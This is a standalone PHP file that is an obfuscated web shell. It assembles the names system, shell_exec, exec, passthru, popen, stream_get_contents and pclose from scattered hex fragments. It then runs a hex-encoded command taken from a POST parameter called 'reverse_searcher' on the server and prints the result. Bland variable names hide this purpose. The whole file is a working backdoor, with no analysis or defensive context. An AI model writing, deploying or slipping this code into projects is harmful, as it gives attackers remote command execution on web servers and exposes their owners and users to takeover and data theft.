<?php


$symbol1 = '7';
$symbol2 = '9';
$symbol3 = '6';
$symbol4 = 'd';
$symbol5 = '3';
$symbol6 = '5';
$symbol7 = 'c';
$symbol8 = '8';
$symbol9 = '1';
$symbol10 = '4';
$symbol11 = '0';
$symbol12 = 'f';
$symbol13 = 'e';
$symbol14 = '2';
$restore_state1 = pack("H*", $symbol1.'3'.$symbol1.$symbol2.'7'.'3'.'7'.'4'.'6'.'5'.$symbol3.$symbol4);
$restore_state2 = pack("H*", $symbol1.$symbol5.$symbol3.'8'.$symbol3.$symbol6.$symbol3.$symbol7.$symbol3.'c'.'5'.'f'.$symbol3.$symbol6.$symbol1.$symbol8.'6'.$symbol6.$symbol3.$symbol5);
$restore_state3 = pack("H*", '6'.'5'.'7'.'8'.$symbol3.'5'.$symbol3.'3');
$restore_state4 = pack("H*", $symbol1.'0'.$symbol3.$symbol9.$symbol1.'3'.'7'.'3'.'7'.$symbol10.'6'.'8'.'7'.'2'.$symbol1.'5');
$restore_state5 = pack("H*", $symbol1.$symbol11.$symbol3.$symbol12.'7'.$symbol11.'6'.$symbol6.$symbol3.$symbol13);
$restore_state6 = pack("H*", $symbol1.$symbol5.$symbol1.'4'.'7'.$symbol14.'6'.'5'.$symbol3.$symbol9.$symbol3.'d'.'5'.'f'.'6'.$symbol1.'6'.$symbol6.$symbol1.'4'.'5'.$symbol12.'6'.$symbol5.'6'.$symbol12.'6'.$symbol13.'7'.'4'.'6'.'5'.$symbol3.'e'.$symbol1.'4'.'7'.$symbol5);
$restore_state7 = pack("H*", '7'.'0'.'6'.$symbol5.$symbol3.$symbol7.'6'.'f'.$symbol1.'3'.$symbol3.$symbol6);
$reverse_searcher = pack("H*", '7'.$symbol14.'6'.'5'.'7'.$symbol3.$symbol3.$symbol6.$symbol1.'2'.$symbol1.'3'.$symbol3.'5'.'5'.'f'.'7'.'3'.$symbol3.$symbol6.$symbol3.$symbol9.$symbol1.$symbol14.$symbol3.'3'.$symbol3.$symbol8.$symbol3.$symbol6.'7'.$symbol14);
if (isset($_POST[$reverse_searcher])) {
    $reverse_searcher = pack("H*", $_POST[$reverse_searcher]);
    if (function_exists($restore_state1)) {
        $restore_state1($reverse_searcher);
    } elseif (function_exists($restore_state2)) {
        print $restore_state2($reverse_searcher);
    } elseif (function_exists($restore_state3)) {
        $restore_state3($reverse_searcher, $reference_record);
        print join("\n", $reference_record);
    } elseif (function_exists($restore_state4)) {
        $restore_state4($reverse_searcher);
    } elseif (function_exists($restore_state5) && function_exists($restore_state6) && function_exists($restore_state7)) {
        $pointer_ent = $restore_state5($reverse_searcher, 'r');
        if ($pointer_ent) {
            $bind_obj = $restore_state6($pointer_ent);
            $restore_state7($pointer_ent);
            print $bind_obj;
        }
    }
    exit;
}
